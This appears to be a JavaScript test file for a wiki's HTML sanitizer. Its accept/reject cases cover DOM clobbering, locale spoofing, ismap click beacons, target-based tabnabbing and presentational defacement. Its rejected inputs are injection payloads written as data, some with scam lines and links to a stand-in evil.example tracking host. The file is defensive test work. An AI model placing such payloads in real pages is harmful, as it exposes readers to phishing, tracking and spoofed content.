rejects('Intro.\n\n<img/attributionsrc src="/wiki/fig.png" alt="x">', 'slash-delimited bare img attributionsrc after tag name');
rejects('Intro.\n\n<img /attributionsrc src="/wiki/fig.png" alt="x">', 'slash-delimited bare img attributionsrc after whitespace');
rejects('Intro.\n\n<img class="x"/attributionsrc src="/wiki/fig.png" alt="x">', 'quote-plus-slash-delimited bare img attributionsrc attribute');
accepts('See <a href="/wiki/stake?attributionsrc=doc">stake docs</a> for details.', 'benign attributionsrc= inside quoted href');
accepts('<img src="/wiki/attributionsrc-demo.png" alt="diagram">', 'benign img src containing attributionsrc substring');
accepts('The attributionsrc attribute is described here only as prose.', 'benign attributionsrc prose');
accepts('<a class=x/attributionsrc href="/wiki/foo/">not an attributionsrc attribute</a>', 'benign slash inside unquoted class value before bare anchor attributionsrc word');
accepts('<img class=x/attributionsrc src="/wiki/fig.png" alt="diagram">', 'benign slash inside unquoted class value before bare img attributionsrc word');

// id=/name= on any element are DOM-clobbering primitives: a browser exposes id'd
// and named elements as properties on document/window, so an injected id/name
// shadows the matching global and can break the site's own scripts. Same
// DOM-structure-integrity class as the blocked <template> element and microdata
// attributes. The build emits no id=/name= (no rehype-slug). Every delimiter the
// patterns recognize is covered below: whitespace, double-/single-/backtick-quote
// abutted, tag-name-slash, whitespace-slash, and quote-slash. Backtick matters
// because emptyQuotedAttributeValues() does not strip backtick-delimited text, so
// `<a href=`x`id=…>` is a real boundary. Unquoted/quoted URL query strings
// containing id=/name= are NOT flagged.
rejects('Intro.\n\n<a id="cookie" href="/wiki/x/">x</a>', 'plain a id attribute');
rejects('Intro.\n\n<img name="body" src="/wiki/fig.png" alt="y">', 'plain img name attribute');
rejects('Intro.\n\n<  span   id = "x">y</span>', 'spaced id attribute');
rejects("Intro.\n\n<span name='body'>z</span>", 'single-quoted name value');
rejects('<a href="/wiki/x/"id="cookie">x</a>', 'double-quote-abutted a id attribute');
rejects("<a href='/wiki/x/'id=\"cookie\">x</a>", 'single-quote-abutted a id attribute');
rejects('<a href=`/wiki/x/`id="cookie">x</a>', 'backtick-abutted a id attribute');
rejects('<a href="/wiki/x/"name="body">x</a>', 'double-quote-abutted a name attribute');
rejects('Intro.\n\n<div/id="cookie">x</div>', 'slash-delimited id after tag name');
rejects('<a href="/wiki/x/"/id="cookie">x</a>', 'double-quote-plus-slash id attribute');
rejects("<a href='/wiki/x/'/id=\"cookie\">x</a>", 'single-quote-plus-slash id attribute');
rejects('<a href=`/wiki/x/`/id="cookie">x</a>', 'backtick-plus-slash id attribute');
rejects('Intro.\n\n<p class="x" /name="y">z</p>', 'whitespace-slash-delimited name attribute');
accepts('See <a href="/wiki/stake?id=5&name=foo">stake</a> for details.', 'benign id=/name= inside quoted href query string');
accepts('<a href=/wiki/stake?id=5>link</a>', 'benign unquoted href query string containing id=');
accepts('<a href=/wiki/page?name=foo>link</a>', 'benign unquoted href query string containing name=');
accepts('The id and name attributes are described here only as prose.', 'benign id/name prose');

// lang=/xml:lang= are the locale sibling of the blocked dir= attribute: lang changes
// locale rendering and the assistive-tech PRONUNCIATION of prose (an injected
// <span lang="ru"> makes a screen reader voice English text with Russian phonetics)
// and drives :lang() CSS — same locale/accessibility-spoof class as dir= and the
// merged role/aria-* family. Build emits no element-level lang=. Every delimiter the
// patterns recognize is covered; hreflang= (a different attribute) and URL query
// strings containing "lang" are NOT flagged.
rejects('Intro.\n\n<span lang="ru">withdraw your TAO here</span>', 'plain lang attribute');
rejects('Intro.\n\n<p xml:lang="ru">x</p>', 'xml:lang attribute');
rejects("Intro.\n\n<  span   lang = 'ru'>y</span>", 'spaced lang single-quoted value');
rejects('<a href="/wiki/x/"lang="ru">x</a>', 'double-quote-abutted lang attribute');
rejects("<a href='/wiki/x/'lang=\"ru\">x</a>", 'single-quote-abutted lang attribute');
rejects('<a href=`/wiki/x/`lang="ru">x</a>', 'backtick-abutted lang attribute');
rejects('Intro.\n\n<div/lang="ru">x</div>', 'slash-delimited lang after tag name');
rejects('<a href="/wiki/x/"/lang="ru">x</a>', 'quote-plus-slash lang attribute');
rejects('Intro.\n\n<p class="x" /lang="ru">z</p>', 'whitespace-slash-delimited lang attribute');
accepts('<a hreflang="en" href="/wiki/x/">link</a>', 'benign hreflang attribute is not lang');
accepts('See <a href="/wiki/x?lang=en">stake</a> for details.', 'benign lang= inside quoted href query string');
accepts('<a href=/wiki/x?lang=en>link</a>', 'benign unquoted href query string containing lang=');
accepts('The lang attribute is described here only as prose.', 'benign lang prose');

// translate= completes the locale family (dir=/lang=): translate="no" is honored by
// browser auto-translation to exclude a subtree, so an injected translate="no" keeps
// an attacker's literal scam line untranslated while the article translates — a
// no-script content-spoof against translation users. Build emits no translate=. Every
// delimiter is covered; class="translate"/data-translate=/URLs with "translate" pass.
rejects('Intro.\n\n<span translate="no">send 5 TAO to 5Fake</span>', 'plain translate attribute');
rejects("Intro.\n\n<  span   translate = 'no'>y</span>", 'spaced translate single-quoted value');
rejects('<a href="/wiki/x/"translate="no">x</a>', 'double-quote-abutted translate attribute');
rejects("<a href='/wiki/x/'translate=\"no\">x</a>", 'single-quote-abutted translate attribute');
rejects('<a href=`/wiki/x/`translate="no">x</a>', 'backtick-abutted translate attribute');
rejects('Intro.\n\n<div/translate="no">x</div>', 'slash-delimited translate after tag name');
rejects('<a href="/wiki/x/"/translate="no">x</a>', 'quote-plus-slash translate attribute');
rejects('Intro.\n\n<p class="x" /translate="no">z</p>', 'whitespace-slash-delimited translate attribute');
accepts('<div class="translate">x</div>', 'benign quoted class value "translate" is not the attribute');
accepts('<div class=translate>x</div>', 'benign unquoted class value translate is not the attribute');
accepts('<div data-translate="x">y</div>', 'benign data-translate attribute is not translate');
accepts('See <a href="/wiki/translate-guide">the translate guide</a>.', 'benign URL containing translate substring');
accepts('The translate attribute is described here only as prose.', 'benign translate prose');

// ismap on <img> is the server-side image-map primitive (counterpart to the
// already-blocked client-side <map>/<area>/usemap= in #411). When the <img> sits
// inside an <a href="...">, clicking the image appends ?x,y coordinates to the
// link URL — a click beacon with no script, handler, or flagged scheme.
rejects('Intro.\n\n<a href="https://evil.example/log"><img ismap src="https://evil.example/track.gif" alt="x"></a>', 'plain img ismap inside anchor');
rejects('Intro.\n\n<img src="/wiki/fig.png" ismap alt="x">', 'plain img ismap standalone');
rejects('Intro.\n\n<img ismap src="/wiki/fig.png" alt="x">', 'bare img ismap before other attrs');
rejects('Intro.\n\n<img src="/wiki/fig.png"   ismap   alt="x">', 'spaced img ismap attribute');
rejects('Intro.\n\n<img ismap  =  "x" src="/wiki/fig.png" alt="x">', 'spaced equals img ismap attribute');
rejects('Intro.\n\n<img ismap=true src="/wiki/fig.png" alt="x">', 'unquoted img ismap attribute value');
rejects('Intro.\n\n<img src="/wiki/fig.png"ismap alt="x">', 'quote-abutted img ismap attribute');
rejects('Intro.\n\n<img/ismap src="/wiki/fig.png" alt="x">', 'slash-delimited bare img ismap after tag name');
rejects('Intro.\n\n<img /ismap src="/wiki/fig.png" alt="x">', 'slash-delimited bare img ismap after whitespace');
rejects('Intro.\n\n<img class="x"/ismap src="/wiki/fig.png" alt="x">', 'quote-plus-slash-delimited bare img ismap attribute');

// Prose that mentions the literal word "ismap" without an attribute assignment,
// and alt text that contains the word, must still pass — guards the new pattern
// against the Codex false positives that closed #445 (plain prose) and #449
// (unquoted URL with "ismap" substring in the path).
accepts('The ismap attribute is obsolete on server-side image maps.', 'benign ismap prose');
accepts('HTML authors discussed the ismap attribute in earlier drafts.', 'benign ismap prose mid-sentence');
accepts('<img src="/wiki/fig.png" alt="the ismap attribute is obsolete">', 'benign ismap word inside img alt');
accepts('<img class=x/ismap src="/wiki/fig.png" alt="diagram">', 'benign slash inside unquoted class value before bare img ismap word');
accepts('<img src=/wiki/ismap-demo.png alt=diagram>', 'benign unquoted img src path containing ismap substring');
accepts('<img src=/wiki/ismap.png alt=diagram>', 'benign unquoted img src path with ismap followed by extension dot');

// target= on an allowed <a> overrides the site's deliberate link policy:
// rehype-external-links always pairs target="_blank" with rel="noopener
// noreferrer", so a raw author target="_blank" re-exposes the window.opener
// reverse-tabnabbing / referrer leak that plugin prevents, and target="_top" or a
// named-frame target hijacks the navigation context. Same policy-subversion class
// as the merged referrerpolicy=/ping=/download= blocks; Markdown never emits
// target= (the build adds it after sanitization). Scanned on
// emptyQuotedAttributeValues() so a quoted href query string mentioning target passes.
rejects('Read [docs](https://x.example/) <a href="https://evil.example/" target="_blank">claim TAO</a>.', 'plain anchor target attribute');
rejects('Intro.\n\n<  a   href="/wiki/stake/"   target = "_blank">x</a>', 'spaced anchor target attribute');
rejects('Intro.\n\n<a href="/wiki/stake/" target="_top">x</a>', 'anchor target _top navigation-context hijack');
rejects('<a href="/wiki/stake/"target="_blank">x</a>', 'quote-abutted anchor target attribute');
rejects('<a href=/wiki/stake/target=_blank>x</a>', 'slash-abutted anchor target attribute');

accepts('See <a href="/wiki/stake?target=summer">stake docs</a> for details.', 'benign target= inside quoted href');
accepts('Opening links in a new target window is described here only as prose.', 'benign target prose');
accepts('<a href="/wiki/target-list">internal link</a>', 'benign target substring in quoted href');

// Prose that merely mentions these English words without the directive colon
// must still pass — guard the new patterns against false positives.
accepts('This client is set to define the class list style, and the server is fast.', 'benign client/server/set/class/define prose');

// Prose with a directive-shaped token followed by a non-directive word must
// pass — the tightened directive regexes (set/html|text, is/raw|inline|global,
// client/load|idle|visible|only|media, server/defer, define/vars) intentionally
// reject only the documented Astro 6.x directive values, not every [a-z-]+
// token. The earlier "is:[a-z-]+" pattern false-positived on prose like
// "a vector is:one validator's" once deobfuscation stripped the newline, which
// broke article ingestion (the cross-repo build failed on `weight_vector`).
accepts("What a vector is:one validator's structured signal must be readable.", 'benign "is:one" prose (was false-positive pre-fix)');
accepts("A token set:foo inside prose is just a colon-terminated word, not a directive.", 'benign "set:foo" prose');
accepts("The client:robot workflow is a normal phrase, not an Astro directive.", 'benign "client:robot" prose');
accepts("Use server:test as a placeholder name in the documentation.", 'benign "server:test" prose');
accepts("A define:macro helper in the article body is prose, not a directive.", 'benign "define:macro" prose');

// clear= on allowed <br> is the obsolete HTML4 float-clear attribute: an
// injected <br clear="all"> forces float clearing in the document flow,
// pushing content below floated elements (like infobox images) — a layout-
// defacement primitive in the same class as the merged align/valign block
// (#435), with no script, handler, or flagged scheme.
rejects('Intro.\n\n<br clear="all">', 'plain br clear attribute');
rejects('Intro.\n\n<br   clear = "left">', 'spaced br clear attribute');
rejects('Intro.\n\n<br clear="right">', 'plain br clear right attribute');
rejects('<br class="x"clear="all">', 'quote-abutted br clear attribute');
rejects('<br class=x/clear="all">', 'slash-delimited br clear attribute');

accepts('<br>', 'plain br without clear');
accepts('<br />', 'self-closing br without clear');
accepts('A clear explanation of the break element is described here only as prose.', 'benign clear prose');

// noshade (boolean) and color=/size= (value) on allowed <hr> set obsolete
// presentational styling without the blocked inline style= attribute — same
// content-styling spoof class as the merged bgcolor=/background= (#434, #435)
// on <body>/<table>/<td> and the <font color/size/face> attributes (<font>
// itself blocked in #433).
//
// The wiki emits <hr> very heavily: 618+ horizontal-rule dividers come from
// Markdown `---` source across the article corpus. An injected
// <hr color="red" size="50"> after "WALLET COMPROMISED" renders an oversized
// red horizontal rule that mimics an admin security banner — same content-
// styling class as the merged frame/rules/summary table block (#471).
rejects('Intro.\n\n<hr color="red" size="50">x</hr>', 'plain hr color/size attributes');
rejects('Intro.\n\n<hr   size = "5">x</hr>', 'spaced hr size attribute');
rejects('Intro.\n\n<hr color="#ff0000">x</hr>', 'plain hr hex color attribute');
rejects('<hr class="x"color="red">', 'quote-abutted hr color attribute');
rejects('<hr class=x/size="5">', 'slash-delimited hr size attribute');
rejects('Intro.\n\n<hr noshade>x</hr>', 'plain hr noshade attribute');
rejects('Intro.\n\n<hr   noshade   >x</hr>', 'spaced hr noshade attribute');
rejects('<hr class="x"noshade>', 'quote-abutted hr noshade attribute');
rejects('<hr class=x/noshade>', 'slash-delimited hr noshade attribute');

accepts('<hr>x</hr>', 'plain hr without visual styling');
accepts('<hr class="divider">x</hr>', 'benign hr class attribute');
accepts('A horizontal rule without noshade or color is described here only as prose.', 'benign hr visual prose');

console.log('Content sanitizer check passed');
